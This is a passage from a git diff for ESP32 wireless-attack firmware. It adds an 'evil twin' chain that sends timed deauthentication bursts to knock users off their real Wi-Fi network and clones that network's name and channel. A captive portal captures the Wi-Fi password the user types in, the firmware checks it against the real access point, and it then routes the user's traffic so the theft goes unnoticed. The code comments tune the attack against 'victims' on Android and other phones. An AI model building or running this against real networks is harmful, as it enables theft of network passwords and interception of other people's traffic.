++        // Keep an eye on the routed link: if the uplink silently dies (AP
++        // rebooted, key rotated) the victim is left on a dead network. Report
++        // it instead of pretending everything is fine.
++        if (s_phase == ET_PHASE_ONLINE && !WiFi.isConnected()) {
++            s_phase = ET_PHASE_ROUTE;
++            setErr("Uplink lost; re-running route");
++            etLog("uplink_lost", WiFi.SSID());
++            String err;
++            if (!etRouteInPlace(s_portal, String(s_staSsid), String(s_staPwd), err)) {
++                s_phase = ET_PHASE_CLONE;
 +            }
++        }
 +
-+            if (!s_handoffDone) {
++        // Legacy handoff for the plain Portal -> NAPT flow. Skipped for the
++        // evil twin: that one routes in place from etServiceVerify() or, for an
++        // open target, as soon as the victim joins us.
++        if (!s_verify && !s_evilTwin) {
++            bool credentialsReady = s_portal->hasCredentials();
++            if (s_armed && credentialsReady && !s_handoffDone) {
++                s_formCount++;
 +                String err;
 +                bool handedOff = portalNaptHandoffFromPortal(s_portal, &err);
 +                if (handedOff) {
 +                    s_handoffDone = true;
-+                    seclabAppendLog("/portal_napt.log", String(seclabUptimeSec()) + ",handoff_ok," + s_staSsid);
++                    s_phase = ET_PHASE_ONLINE;
++                    etLog("handoff_ok", s_staSsid);
 +                } else {
 +                    setErr("NAPT handoff failed: " + err);
 +                    s_handoffDone = true; // avoid retrying after portal teardown
-+                    seclabAppendLog("/portal_napt.log", String(seclabUptimeSec()) + ",handoff_fail," + err);
++                    s_phase = ET_PHASE_CLONE;
++                    etLog("handoff_fail", err);
 +                }
 +                tearDownPortal();
 +                ensureMux();
@@ -33797,7 +34579,9 @@ index 0000000..9067c2a
 +                xSemaphoreGive(s_mux);
 +            }
 +        }
-+        vTaskDelay(pdMS_TO_TICKS(25));
++        // Poll fast enough that a joining victim is noticed before the next
++        // deauth burst (a 250 ms tick keeps worst-case overlap tiny).
++        vTaskDelay(pdMS_TO_TICKS(50));
 +    }
 +
 +    tearDownPortal();
@@ -33811,6 +34595,7 @@ index 0000000..9067c2a
 +        persistState();
 +        xSemaphoreGive(s_mux);
 +    }
++    s_phase = ET_PHASE_IDLE;
 +    s_running = false;
 +    s_task = nullptr;
 +    vTaskDelete(NULL);
@@ -33830,14 +34615,25 @@ index 0000000..9067c2a
 +    s_staSsid[sizeof(s_staSsid) - 1] = 0;
 +    strncpy(s_staPwd, staPwd.c_str(), sizeof(s_staPwd) - 1);
 +    s_staPwd[sizeof(s_staPwd) - 1] = 0;
-+    s_apChannel = apChannel;
++    s_apChannel = evilTwinSanitizeChannel(apChannel);
 +    s_deauth = deauth;
 +    s_verify = verify;
++    s_evilTwin = verify; // verified run: route in place, never tear the AP down
 +    s_armed = handoff;
 +    s_handoffDone = false;
 +    s_formCount = 0;
 +    s_lastErr[0] = 0;
 +    s_startedMs = millis();
++    // Reset the evil-twin window so a restart never inherits a spent budget.
++    s_phase = ET_PHASE_IDLE;
++    s_burstsDone = 0;
++    s_windowStart = 0;
++    s_lastBurstMs = 0;
++    s_rejoinGraceUntil = 0;
++    s_victimSeen = false;
++    s_lastVerify = ET_VERIFY_PENDING;
++    s_lastDeauthAction = ET_DEAUTH_WAIT;
++    evilPortalVerifyAbortReset();
 +
 +    s_stopReq = false;
 +    s_running = true;
@@ -33940,11 +34736,31 @@ index 0000000..9067c2a
 +    return startEngineEx(apSsid, apChannel, deauth, verify, staSsid, staPwd, handoff, errOut);
 +}
 +
++bool portalNaptStartEvilTwinEx(const String &targetSsid, uint8_t targetChannel, const uint8_t *targetBssid,
++                               bool deauth, bool verify, String *errOut) {
++    // Deauth + Clone (same SSID/channel) + Verify + Route (NAPT via captured creds).
++    // No existing uplink is required at start: the route is armed with the
++    // verified key, in place, without ever dropping the cloned AP.
++    if (evilTwinChannelUsable(targetChannel)) s_targetCh = targetChannel;
++    else if (!evilTwinChannelUsable(s_targetCh)) s_targetCh = evilTwinSanitizeChannel(6);
++    if (targetBssid) {
++        memcpy(s_cloneBssid, targetBssid, 6);
++        s_haveCloneBssid = true;
++    }
++    // Cloning on a different channel than the target is the #1 cause of "the
++    // victim sees two networks and joins the wrong one"; warn loudly.
++    if (!evilTwinCloneChannelMatchesTarget(s_apChannel, s_targetCh)) {
++        setErr("Clone channel differs from target channel");
++    }
++    return startEngineEx(targetSsid, s_targetCh, deauth, verify, targetSsid, "", true, errOut);
++}
++
 +bool portalNaptStartEvilTwin(const String &targetSsid, uint8_t targetChannel, const String &staSsid, const String &staPwd, String *errOut) {
 +    // Deauth + Clone (same SSID/channel) + Verify + Route (NAPT via captured creds)
 +    // Do not require an existing STA uplink at start; handoff will use the verified password.
 +    String uplinkSsid = staSsid.length() ? staSsid : targetSsid;
 +    String uplinkPwd = staPwd;
++    if (evilTwinChannelUsable(targetChannel)) s_targetCh = targetChannel;
 +    return startEngineEx(targetSsid, targetChannel, true, true, uplinkSsid, uplinkPwd, true, errOut);
 +}
 +
@@ -33963,6 +34779,9 @@ index 0000000..9067c2a
 +        return;
 +    }
 +    s_stopReq = true;
++    // Abort an in-flight verification instead of holding the radio for the
++    // rest of its timeout (a stop must feel immediate on the device UI).
++    evilPortalVerifyAbort();
 +    for (int i = 0; i < 80 && s_running; i++) vTaskDelay(pdMS_TO_TICKS(25));
 +    // A successful handoff leaves NAPT running in the background: that is the
 +    // whole point of this module. Callers can stop it explicitly from #1 NAPT.
@@ -33990,6 +34809,11 @@ index 0000000..9067c2a
 +    j += "\"staSsid\":\"" + seclabJsonEscape(s_staSsid) + "\",";
 +    j += "\"forms\":" + String((unsigned long)s_formCount) + ",";
 +    j += "\"lastErr\":\"" + seclabJsonEscape(s_lastErr) + "\",";
++    j += "\"phase\":\"" + String(evilTwinPhaseName(s_phase)) + "\",";
++    j += "\"deauth\":\"" + String(evilTwinDeauthActionName(s_lastDeauthAction)) + "\",";
++    j += "\"bursts\":" + String((unsigned)s_burstsDone) + ",";
++    j += "\"victim\":" + String(s_victimSeen ? "true" : "false") + ",";
++    j += "\"verify\":\"" + String(evilTwinVerifyResultName(s_lastVerify)) + "\",";
 +    j += "\"uptimeSec\":" + String(s_running ? (unsigned long)((millis() - s_startedMs) / 1000UL) : 0UL) + "}";
 +    xSemaphoreGive(s_mux);
 +    return j;
@@ -34065,10 +34889,10 @@ index 0000000..9067c2a
 +#endif
 diff --git a/src/modules/wifi/portal_napt.h b/src/modules/wifi/portal_napt.h
 new file mode 100644
-index 0000000..06e746b
+index 00000000..f8d75952
 --- /dev/null
 +++ b/src/modules/wifi/portal_napt.h
-@@ -0,0 +1,30 @@
+@@ -0,0 +1,34 @@
 +#ifndef __PORTAL_NAPT_H__
 +#define __PORTAL_NAPT_H__
 +
@@ -34087,6 +34911,10 @@ index 0000000..06e746b
 +bool portalNaptStartEx(const String &apSsid, uint8_t apChannel, bool deauth, bool verify,
 +                     const String &staSsid, const String &staPwd, bool handoff, String *errOut = nullptr);
 +bool portalNaptStartEvilTwin(const String &targetSsid, uint8_t targetChannel, const String &staSsid, const String &staPwd, String *errOut = nullptr);
++// Evil Twin with an explicit target BSSID and optional deauth/verify stages.
++// The clone is created on the target channel and routing is armed in place.
++bool portalNaptStartEvilTwinEx(const String &targetSsid, uint8_t targetChannel, const uint8_t *targetBssid,
++                               bool deauth, bool verify, String *errOut = nullptr);
 +
 +// Called by the classic EvilPortal after its captive form is submitted.
 +// Stops the captive server, keeps the same open SSID, and starts NAPT.
@@ -34101,7 +34929,7 @@ index 0000000..06e746b
 +#endif
 diff --git a/src/modules/wifi/probe_radar.cpp b/src/modules/wifi/probe_radar.cpp
 new file mode 100644
-index 0000000..f6f0d50
+index 00000000..f6f0d502
 --- /dev/null
 +++ b/src/modules/wifi/probe_radar.cpp
 @@ -0,0 +1,732 @@
@@ -34839,7 +35667,7 @@ index 0000000..f6f0d50
 +#endif
 diff --git a/src/modules/wifi/probe_radar.h b/src/modules/wifi/probe_radar.h
 new file mode 100644
-index 0000000..0a6c76a
+index 00000000..0a6c76ab
 --- /dev/null
 +++ b/src/modules/wifi/probe_radar.h
 @@ -0,0 +1,6 @@
@@ -34851,7 +35679,7 @@ index 0000000..0a6c76a
 +#endif
 diff --git a/src/modules/wifi/responder_plus.cpp b/src/modules/wifi/responder_plus.cpp
 new file mode 100644
-index 0000000..db9dba3
+index 00000000..db9dba33
 --- /dev/null
 +++ b/src/modules/wifi/responder_plus.cpp
 @@ -0,0 +1,467 @@
@@ -35324,7 +36152,7 @@ index 0000000..db9dba3
 +#endif
 diff --git a/src/modules/wifi/responder_plus.h b/src/modules/wifi/responder_plus.h
 new file mode 100644
-index 0000000..3264165
+index 00000000..3264165b
 --- /dev/null
 +++ b/src/modules/wifi/responder_plus.h
 @@ -0,0 +1,17 @@
@@ -35347,7 +36175,7 @@ index 0000000..3264165
 +#endif
 diff --git a/src/modules/wifi/wids_csi_ftm.cpp b/src/modules/wifi/wids_csi_ftm.cpp
 new file mode 100644
-index 0000000..001fad7
+index 00000000..001fad76
 --- /dev/null
 +++ b/src/modules/wifi/wids_csi_ftm.cpp
 @@ -0,0 +1,936 @@
@@ -36289,7 +37117,7 @@ index 0000000..001fad7
 +#endif
 diff --git a/src/modules/wifi/wids_csi_ftm.h b/src/modules/wifi/wids_csi_ftm.h
 new file mode 100644
-index 0000000..8585d75
+index 00000000..8585d75f
 --- /dev/null
 +++ b/src/modules/wifi/wids_csi_ftm.h
 @@ -0,0 +1,10 @@
@@ -36304,7 +37132,7 @@ index 0000000..8585d75
 +
 +#endif
 diff --git a/src/modules/wifi/wifi_atks.cpp b/src/modules/wifi/wifi_atks.cpp
-index 2e206e7..3ddb9da 100644
+index 2e206e76..3ddb9da6 100644
 --- a/src/modules/wifi/wifi_atks.cpp
 +++ b/src/modules/wifi/wifi_atks.cpp
 @@ -4,6 +4,8 @@
@@ -36337,7 +37165,7 @@ index 2e206e7..3ddb9da 100644
      if (scanAtks) {
 diff --git a/src/modules/wifi/wifi_observation_logic.h b/src/modules/wifi/wifi_observation_logic.h
 new file mode 100644
-index 0000000..297064f
+index 00000000..297064ff
 --- /dev/null
 +++ b/src/modules/wifi/wifi_observation_logic.h
 @@ -0,0 +1,110 @@
@@ -36452,7 +37280,7 @@ index 0000000..297064f
 +    return best;
 +}
 diff --git a/src/modules/wifi/wifite.cpp b/src/modules/wifi/wifite.cpp
-index 327074a..8cf95db 100644
+index 327074a1..8cf95db8 100644
 --- a/src/modules/wifi/wifite.cpp
 +++ b/src/modules/wifi/wifite.cpp
 @@ -129,9 +129,14 @@ class App {
@@ -38798,3 +39626,352 @@ index 00000000..212b519d
 +}(function () {
 +    return qrcode;
 +}));
+diff --git a/src/modules/wifi/evil_twin_logic.h b/src/modules/wifi/evil_twin_logic.h
+new file mode 100644
+index 00000000..741a273a
+--- /dev/null
++++ b/src/modules/wifi/evil_twin_logic.h
+@@ -0,0 +1,343 @@
++#pragma once
++// Evil Twin (Deauth -> Clone -> Verify -> Route) policy — Arduino-free.
++//
++// Why this file exists: the chain used to be three tools glued together, and
++// the seams were what kicked victims off *both* networks:
++//
++//   1. Deauth ran forever at 250 ms. A phone that deauthenticates, re-associates
++//      to the real AP, gets deauthenticated again (2-3 s loop) treats the
++//      network as broken ("authentication problem") and stops auto-joining it.
++//      Android then falls back to mobile data and the victim is gone from BOTH
++//      the real and the fake network. -> deauth must be a short, backed-off
++//      *kick window*, and must stop the moment a victim joins our clone.
++//   2. Verification called WiFi.begin() while the SoftAP was up. In AP+STA the
++//      driver forces the AP onto the STA channel, so every verify attempt on a
++//      different channel drops every client of the clone AP (the classic
++//      "device drops off the fake network" report). -> the STA must be locked
++//      to the clone channel (and to the target BSSID), never hop.
++//   3. The handoff stopped the portal (softAPdisconnect) and then re-created
++//      the AP on the STA channel: 10+ s without a beacon, new BSSID, new DHCP
++//      server. Phones give up long before that. -> upgrade NAPT in place.
++//   4. Verification ran inside the AsyncWebServer request handler and blocked
++//      6+ s, so the captive page timed out (Android marks "no internet" and
++//      drops the network). -> verify asynchronously, answer the form instantly.
++//
++// Everything here is pure so it can be host-tested (tests/chain).
++
++#include <cstddef>
++#include <cstdint>
++#include <cstdio>
++#include <cstring>
++
++// ---------------------------------------------------------------------------
++// Phases (also reported to WebUI/CLI as the chain "step")
++// ---------------------------------------------------------------------------
++enum EvilTwinPhase : uint8_t {
++    ET_PHASE_IDLE = 0,
++    ET_PHASE_ARMING,   // clone AP coming up on the target channel
++    ET_PHASE_DEAUTH,   // kick window running
++    ET_PHASE_CLONE,    // clone beaconing, waiting for a victim
++    ET_PHASE_VERIFY,   // submitted key being tested against the real AP
++    ET_PHASE_ROUTE,    // NAPT being armed on the existing AP
++    ET_PHASE_ONLINE,   // victim has real internet through us
++    ET_PHASE_FAILED,
++};
++
++inline const char *evilTwinPhaseName(EvilTwinPhase p) {
++    switch (p) {
++        case ET_PHASE_ARMING: return "Clone";
++        case ET_PHASE_DEAUTH: return "Deauth";
++        case ET_PHASE_CLONE: return "Clone";
++        case ET_PHASE_VERIFY: return "Verify";
++        case ET_PHASE_ROUTE: return "Route";
++        case ET_PHASE_ONLINE: return "Online";
++        case ET_PHASE_FAILED: return "Failed";
++        default: return "Idle";
++    }
++}
++
++inline bool evilTwinPhaseIsActive(EvilTwinPhase p) {
++    return p != ET_PHASE_IDLE && p != ET_PHASE_FAILED;
++}
++
++// ---------------------------------------------------------------------------
++// Timing profile (one place to tune the whole chain)
++// ---------------------------------------------------------------------------
++struct EvilTwinTiming {
++    uint16_t burstGapMs;      // first pause between deauth bursts
++    uint16_t maxBurstGapMs;   // backoff ceiling
++    uint8_t maxBursts;        // total kick bursts before giving up quietly
++    uint8_t framesPerBurst;   // deauth+disassoc pairs per burst
++    uint32_t verifyTimeoutMs; // how long a submitted key may take
++    uint32_t rejoinGraceMs;   // no deauth this long after a victim joins us
++    uint16_t pmkidGraceMs;    // settle time after clone AP is up before deauth
++};
++
++inline EvilTwinTiming evilTwinDefaultTiming() {
++    EvilTwinTiming t;
++    t.burstGapMs = 1200;
++    t.maxBurstGapMs = 8000;
++    t.maxBursts = 6;
++    t.framesPerBurst = 3;
++    t.verifyTimeoutMs = 9000;
++    t.rejoinGraceMs = 45000;
++    t.pmkidGraceMs = 600;
++    return t;
++}
++
++// Exponential backoff, capped. 1200, 2400, 4800, 8000, 8000, ...
++inline uint32_t evilTwinDeauthGapMs(const EvilTwinTiming &t, uint8_t burstsDone) {
++    uint32_t gap = t.burstGapMs;
++    for (uint8_t i = 0; i < burstsDone && gap < t.maxBurstGapMs; i++) gap <<= 1;
++    if (gap > t.maxBurstGapMs) gap = t.maxBurstGapMs;
++    if (gap == 0) gap = 1;
++    return gap;
++}
++
++// ---------------------------------------------------------------------------
++// Deauth decision
++// ---------------------------------------------------------------------------
++enum EvilTwinDeauthAction : uint8_t {
++    ET_DEAUTH_SEND = 0,
++    ET_DEAUTH_WAIT,
++    ET_DEAUTH_STOP_JOINED,   // a victim is on our clone: never kick it again
++    ET_DEAUTH_STOP_VERIFY,   // our own STA is testing a key right now
++    ET_DEAUTH_STOP_ROUTED,   // victim already has internet through us
++    ET_DEAUTH_STOP_PMF,      // target requires 802.11w; frames are ignored
++    ET_DEAUTH_STOP_BUDGET,   // kick window exhausted; stay quiet, keep cloning
++    ET_DEAUTH_STOP_NO_PORTAL,// nothing to steer the victim to yet
++};
++
++inline const char *evilTwinDeauthActionName(EvilTwinDeauthAction a) {
++    switch (a) {
++        case ET_DEAUTH_SEND: return "send";
++        case ET_DEAUTH_WAIT: return "wait";
++        case ET_DEAUTH_STOP_JOINED: return "stop-joined";
++        case ET_DEAUTH_STOP_VERIFY: return "stop-verify";
++        case ET_DEAUTH_STOP_ROUTED: return "stop-routed";
++        case ET_DEAUTH_STOP_PMF: return "stop-pmf";
++        case ET_DEAUTH_STOP_BUDGET: return "stop-budget";
++        case ET_DEAUTH_STOP_NO_PORTAL: return "stop-no-portal";
++        default: return "wait";
++    }
++}
++
++inline bool evilTwinDeauthShouldSend(EvilTwinDeauthAction a) { return a == ET_DEAUTH_SEND; }
++
++struct EvilTwinDeauthInput {
++    uint32_t nowMs;
++    uint32_t windowStartMs; // when the clone AP finished coming up
++    uint8_t burstsDone;
++    uint32_t lastBurstMs;
++    bool victimOnOurAp;
++    bool verifying;
++    bool routed;
++    bool pmfRequired;
++    bool portalUp;
++    uint32_t rejoinGraceUntilMs; // set when a victim joined (0 = none)
++    EvilTwinTiming timing;
++};
++
++inline EvilTwinDeauthAction evilTwinDeauthAction(const EvilTwinDeauthInput &in) {
++    // Safety gates first: anything that could disturb our own victim wins.
++    if (in.routed) return ET_DEAUTH_STOP_ROUTED;
++    if (in.verifying) return ET_DEAUTH_STOP_VERIFY;
++    if (in.pmfRequired) return ET_DEAUTH_STOP_PMF;
++    if (in.victimOnOurAp) return ET_DEAUTH_STOP_JOINED;
++    if (in.rejoinGraceUntilMs && (int32_t)(in.nowMs - in.rejoinGraceUntilMs) < 0) return ET_DEAUTH_WAIT;
++    if (!in.portalUp) return ET_DEAUTH_STOP_NO_PORTAL;
++    if (in.burstsDone >= in.timing.maxBursts) return ET_DEAUTH_STOP_BUDGET;
++    uint32_t since = in.nowMs - in.windowStartMs;
++    if (since < in.timing.pmkidGraceMs) return ET_DEAUTH_WAIT;
++    // First burst fires as soon as the grace time is over.
++    uint32_t sinceBurst = in.nowMs - in.lastBurstMs;
++    if (in.burstsDone == 0 || sinceBurst >= evilTwinDeauthGapMs(in.timing, (uint8_t)(in.burstsDone - 1)))
++        return ET_DEAUTH_SEND;
++    return ET_DEAUTH_WAIT;
++}
++
++// ---------------------------------------------------------------------------
++// Verification policy: lock the STA to the clone channel + target BSSID
++// ---------------------------------------------------------------------------
++struct EvilTwinVerifyPlan {
++    bool lockChannel;      // pass the clone channel to WiFi.begin()
++    bool lockBssid;        // pass the target BSSID (kills multi-BSSID roaming)
++    bool keepAp;           // never change WiFi.mode() / never softAPdisconnect()
++    bool autoReconnectOff; // no background retries fighting our AP
++    uint8_t channel;       // channel actually used (sanitised)
++    uint32_t timeoutMs;
++    bool channelUsable;
++};
++
++inline bool evilTwinChannelUsable(int ch) { return ch >= 1 && ch <= 14; }
++
++inline uint8_t evilTwinSanitizeChannel(int ch) {
++    if (!evilTwinChannelUsable(ch)) return 6;
++    return (uint8_t)ch;
++}
++
++inline EvilTwinVerifyPlan evilTwinVerifyPlan(uint8_t cloneCh, uint8_t targetCh, bool haveBssid,
++                                            const EvilTwinTiming &t) {
++    EvilTwinVerifyPlan p;
++    p.lockChannel = true;
++    p.lockBssid = haveBssid;
++    p.keepAp = true;
++    p.autoReconnectOff = true;
++    p.channel = evilTwinSanitizeChannel(cloneCh ? cloneCh : targetCh);
++    p.timeoutMs = t.verifyTimeoutMs ? t.verifyTimeoutMs : 9000;
++    p.channelUsable = evilTwinChannelUsable(cloneCh) && evilTwinChannelUsable(targetCh) &&
++                      (targetCh == 0 || cloneCh == targetCh);
++    return p;
++}
++
++// The clone must beacon on the target channel: same channel keeps both the
++// victim's roam and our own STA verification from moving the SoftAP.
++inline bool evilTwinCloneChannelMatchesTarget(uint8_t cloneCh, uint8_t targetCh) {
++    if (!evilTwinChannelUsable(targetCh)) return true; // unknown target: keep clone as-is
++    return evilTwinChannelUsable(cloneCh) && cloneCh == targetCh;
++}
++
++// ---------------------------------------------------------------------------
++// Verify result classification (disconnect reasons from esp_wifi_types.h)
++// ---------------------------------------------------------------------------
++enum EvilTwinVerifyResult : uint8_t {
++    ET_VERIFY_PENDING = 0,
++    ET_VERIFY_OK,
++    ET_VERIFY_WRONG_KEY,
++    ET_VERIFY_NO_AP,
++    ET_VERIFY_TIMEOUT,
++    ET_VERIFY_REJECTED, // assoc/auth refused for another reason
++};
++
++inline const char *evilTwinVerifyResultName(EvilTwinVerifyResult r) {
++    switch (r) {
++        case ET_VERIFY_OK: return "ok";
++        case ET_VERIFY_WRONG_KEY: return "wrong-key";
++        case ET_VERIFY_NO_AP: return "no-ap";
++        case ET_VERIFY_TIMEOUT: return "timeout";
++        case ET_VERIFY_REJECTED: return "rejected";
++        default: return "pending";
++    }
++}
++
++// reason: WIFI_REASON_* captured from ARDUINO_EVENT_WIFI_STA_DISCONNECTED
++inline EvilTwinVerifyResult evilTwinClassifyVerify(bool connected, int disconnectReason) {
++    if (connected) return ET_VERIFY_OK;
++    switch (disconnectReason) {
++        case 15:  // 4WAY_HANDSHAKE_TIMEOUT -> wrong key, by far the common case
++        case 204: // HANDSHAKE_TIMEOUT (ESP-IDF local code)
++        case 23:  // 802_1X_AUTH_FAILED
++        case 2:   // AUTH_EXPIRE
++        case 24:  // AUTH_LEAVE
++            return ET_VERIFY_WRONG_KEY;
++        case 201: // NO_AP_FOUND
++        case 200: // BEACON_TIMEOUT
++            return ET_VERIFY_NO_AP;
++        case 3:   // DEAUTH_LEAVING (someone kicked us / the real AP is gone)
++        case 205: // CONNECTION_FAIL
++        case 8:   // ASSOC_LEAVE
++            return ET_VERIFY_REJECTED;
++        default:
++            return ET_VERIFY_TIMEOUT;
++    }
++}
++
++inline EvilTwinPhase evilTwinPhaseForVerify(EvilTwinVerifyResult r) {
++    switch (r) {
++        case ET_VERIFY_OK: return ET_PHASE_ROUTE;
++        case ET_VERIFY_PENDING: return ET_PHASE_VERIFY;
++        default: return ET_PHASE_CLONE; // stay available for a retry
++    }
++}
++
++// ---------------------------------------------------------------------------
++// Handoff: upgrade the running AP to a router instead of restarting it
++// ---------------------------------------------------------------------------
++enum EvilTwinHandoffMode : uint8_t {
++    ET_HANDOFF_IN_PLACE = 0, // keep BSSID/channel/DHCP leases: no client drop
++    ET_HANDOFF_RESTART_AP,   // no AP up (or wrong subnet): must (re)create it
++    ET_HANDOFF_BLOCKED,      // would drop every client: refuse and report
++};
++
++inline EvilTwinHandoffMode evilTwinHandoffMode(bool apUp, bool apOnNaptSubnet, uint8_t apCh,
++                                               uint8_t targetCh, bool staConnected) {
++    if (!apUp) return ET_HANDOFF_RESTART_AP;
++    if (!apOnNaptSubnet) return ET_HANDOFF_RESTART_AP;
++    // With an AP up, a channel change is exactly what disconnects everyone.
++    if (evilTwinChannelUsable(targetCh) && apCh != targetCh) {
++        return staConnected ? ET_HANDOFF_IN_PLACE : ET_HANDOFF_BLOCKED;
++    }
++    return ET_HANDOFF_IN_PLACE;
++}
++
++inline const char *evilTwinHandoffModeName(EvilTwinHandoffMode m) {
++    switch (m) {
++        case ET_HANDOFF_IN_PLACE: return "in-place";
++        case ET_HANDOFF_RESTART_AP: return "restart-ap";
++        default: return "blocked";
++    }
++}
++
++// ---------------------------------------------------------------------------
++// Captive portal probes (Android is the strict one)
++// ---------------------------------------------------------------------------
++enum EvilTwinProbe : uint8_t {
++    ET_PROBE_NONE = 0,
++    ET_PROBE_ANDROID_204, // connectivitycheck.gstatic.com/generate_204
++    ET_PROBE_APPLE,       // captive.apple.com/hotspot-detect.html
++    ET_PROBE_WINDOWS,     // msftconnecttest.com/connecttest.txt
++    ET_PROBE_FIREFOX,     // detectportal.firefox.com
++    ET_PROBE_OTHER,
++};
++
++// Once the victim really has internet we must answer 204/200-success, otherwise
++// Android keeps the "no internet" state (and may fall back to mobile data).
++inline EvilTwinProbe evilTwinClassifyProbe(const char *url) {
++    if (!url || !*url) return ET_PROBE_NONE;
++    auto has = [](const char *h, const char *n) { return std::strstr(h, n) != nullptr; };
++    if (has(url, "generate_204") || has(url, "gen_204") || has(url, "connectivitycheck")) return ET_PROBE_ANDROID_204;
++    if (has(url, "hotspot-detect") || has(url, "captive.apple")) return ET_PROBE_APPLE;
++    if (has(url, "connecttest") || has(url, "ncsi.txt") || has(url, "msftconnecttest")) return ET_PROBE_WINDOWS;
++    if (has(url, "detectportal")) return ET_PROBE_FIREFOX;
++    return ET_PROBE_OTHER;
++}
++
++// status code + body hint for a probe while the portal is still a portal
++inline int evilTwinProbeStatus(EvilTwinProbe p, bool internetUp) {
++    switch (p) {
++        case ET_PROBE_ANDROID_204: return internetUp ? 204 : 302;
++        case ET_PROBE_APPLE:
++        case ET_PROBE_WINDOWS:
++        case ET_PROBE_FIREFOX: return internetUp ? 200 : 302;
++        default: return 302;
++    }
++}
++
++// A victim that just (re)joined must not be kicked for rejoinGraceMs.
++inline uint32_t evilTwinJoinGraceDeadline(uint32_t nowMs, const EvilTwinTiming &t) {
++    return nowMs + (t.rejoinGraceMs ? t.rejoinGraceMs : 45000);
++}
++
++// ---------------------------------------------------------------------------
++// State JSON (kept tiny; WebUI/CLI both read it)
++// ---------------------------------------------------------------------------
++struct EvilTwinSnapshot {
++    EvilTwinPhase phase;
++    uint8_t burstsDone;
++    bool victimOnOurAp;
++    bool routed;
++    EvilTwinVerifyResult lastVerify;
++    const char *deauth;
++};
++
++inline size_t evilTwinSnapshotJson(const EvilTwinSnapshot &s, char *out, size_t cap) {
++    if (!out || cap == 0) return 0;
++    int n = snprintf(out, cap,
++                     "{\"phase\":\"%s\",\"deauth\":\"%s\",\"bursts\":%u,\"victim\":%s,"
++                     "\"routed\":%s,\"verify\":\"%s\"}",
++                     evilTwinPhaseName(s.phase), s.deauth ? s.deauth : "wait", (unsigned)s.burstsDone,
++                     s.victimOnOurAp ? "true" : "false", s.routed ? "true" : "false",
++                     evilTwinVerifyResultName(s.lastVerify));
++    if (n < 0) { if (cap) out[0] = 0; return 0; }
++    return (size_t)n < cap ? (size_t)n : cap - 1;
++}
